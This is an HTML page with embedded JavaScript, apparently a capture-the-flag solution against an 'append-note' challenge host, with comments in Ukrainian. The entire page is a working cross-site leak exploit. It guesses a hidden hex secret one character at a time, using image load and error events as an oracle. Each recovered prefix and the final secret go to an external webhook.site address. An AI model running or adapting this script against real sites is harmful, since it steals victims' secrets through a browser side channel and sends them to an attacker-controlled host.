<!DOCTYPE html>
<html>
<body>
    <script>
        const TARGET = "https://append-note-9na9l.instancer.lac.tf";
        const WEBHOOK = "https://webhook.site/813e752f-c17f-4c9f-9dde-ec9605ff6a59";
        const ALPHABET = "0123456789abcdef";
        let secret = "";

        async function check(testStr) {
            return new Promise((resolve) => {
                const img = new Image();
                // Якщо рядок є префіксом НОТАТКИ, сервер поверне 200 OK.
                // Оскільки ми хочемо знайти секрет, а не власні попередні спроби,
                // нам треба діяти ШВИДКО після рестарту інстансу.
                img.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/favicon.ico`;
                
                img.onload = () => resolve(true);
                img.onerror = () => resolve(false);
                
                // Через 400мс вважаємо, що не вгадали
                setTimeout(() => resolve(false), 400);
            });
        }

        async function run() {
            // ПОВІДОМЛЕННЯ: Перед запуском бота ОБОВ'ЯЗКОВО рестартоніть інстанс завдання!
            // Це очистить масив notes від попередніх спроб.
            
            for (let i = 0; i < 8; i++) {
                for (let char of ALPHABET) {
                    let attempt = secret + char;
                    // Ми використовуємо fetch з mode: no-cors, щоб просто отримати статус
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 1000);

                    try {
                        const res = await fetch(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, {
                            mode: 'no-cors'
                        });
                        // У цьому завданні статус 200/404 для no-cors fetch 
                        // важко розрізнити, тому Image() або Object краще.
                        
                        if (await check(attempt)) {
                            secret += char;
                            fetch(`${WEBHOOK}?found=${secret}`);
                            break;
                        }
                    } catch (e) {}
                }
            }
            fetch(`${WEBHOOK}?final=${secret}`);
        }

        window.onload = run;
    </script>
</body>
</html>